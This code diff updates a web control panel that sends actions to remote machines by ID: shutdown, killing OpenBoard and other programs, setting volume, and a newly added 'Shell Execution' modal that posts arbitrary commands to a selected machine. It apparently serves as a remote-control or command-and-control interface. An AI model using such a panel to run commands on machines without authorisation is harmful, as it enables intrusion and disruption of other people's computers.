@@ -190,7 +190,11 @@
                   <button onclick="handleAction(${serverId}, 'shutdown')">Timed shutdown (instant)</button>
                   <button onclick="handleAction(${serverId}, 'killDesktop')">Kill Desktop V2</button>
                   <button onclick="handleAction(${serverId}, 'killOpenBoard')">Kill OpenBoard</button>
+                  <button onclick="handleAction(${serverId}, 'killShit')">Kill Shit</button>
                   <button onclick="handleAction(${serverId}, 'VOLUPMAX')">Volume Up 100%</button>
+                  <button onclick="handleAction(${serverId}, 'VOLUPMIN')">Volume Down 0%</button>
+                  <button onclick="openCommandModal(${serverId})">Shell Execution</button>
+
                 </div>
               </div>
             </div>
@@ -202,6 +206,44 @@
 
     function sleep(ms) {
       return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    function openCommandModal(serverId) {
+      const modal = document.getElementById('commandModal');
+      const overlay = document.getElementById('overlay');
+      modal.style.display = 'block';
+      overlay.style.display = 'block';
+      modal.dataset.serverId = serverId;
+    }
+
+    function closeModal() {
+      const modal = document.getElementById('commandModal');
+      const overlay = document.getElementById('overlay');
+      modal.style.display = 'none';
+      overlay.style.display = 'none';
+    }
+
+    function executeCommand() {
+      const modal = document.getElementById('commandModal');
+      const serverId = modal.dataset.serverId;
+      const command = document.getElementById('customCommandInput').value.trim();
+
+      if (!command) {
+        alert('Please enter a command.');
+        return;
+      }
+      let xhr = new XMLHttpRequest();
+      xhr.open('POST', `/api/postsender`);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.onload = function () {
+        if (xhr.status === 200) {
+          alert('Command executed successfully.');
+        } else {
+          alert(`Failed to execute command: ${xhr.responseText}`);
+        }
+        closeModal();
+      };
+      xhr.send(JSON.stringify({ imsi: serverId, cmd: command }));
     }
 
     function handleAction(serverId, action) {
@@ -223,10 +265,18 @@
         let xhr = new XMLHttpRequest();
         xhr.open('GET', `/api/querysender?imsi=${serverId}&cmd=ACTIONVOLUPMAX|${fexecdelay}|${execdelays}|${repeats}`);
         xhr.send();
+      }else if(action == 'VOLUPMIN'){
+        let xhr = new XMLHttpRequest();
+        xhr.open('GET', `/api/querysender?imsi=${serverId}&cmd=ACTIONVOLUPMIN|${fexecdelay}|${execdelays}|${repeats}`);
+        xhr.send();
       }
       else if(action == 'killOpenBoard'){
         let xhr = new XMLHttpRequest();
         xhr.open('GET', `/api/querysender?imsi=${serverId}&cmd=ACTIONKILLOPENBOARD|${fexecdelay}|${execdelays}|${repeats}`);
+        xhr.send();
+      }else if(action == 'killShit'){
+        let xhr = new XMLHttpRequest();
+        xhr.open('GET', `/api/querysender?imsi=${serverId}&cmd=ACTIONKILLSHIT|${fexecdelay}|${execdelays}|${repeats}`);
         xhr.send();
       }
       else if(action == 'killswitch'){
@@ -236,7 +286,20 @@
       }
     }
 
+
     fetchServers()
   </script>
+
+  <div id="commandModal" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3); z-index: 1000;">
+    <h3>Custom Command Execution</h3>
+    <label for="customCommandInput">Command:</label>
+    <input type="text" id="customCommandInput" style="width: 100%; margin-bottom: 10px;" />
+    <div class="button-container">
+      <button class="button" onclick="executeCommand()">Execute</button>
+      <button class="button" onclick="closeModal()">Close</button>
+    </div>
+  </div>
+  <div id="overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 999;" onclick="closeModal()"></div>
+
 </body>
 </html>
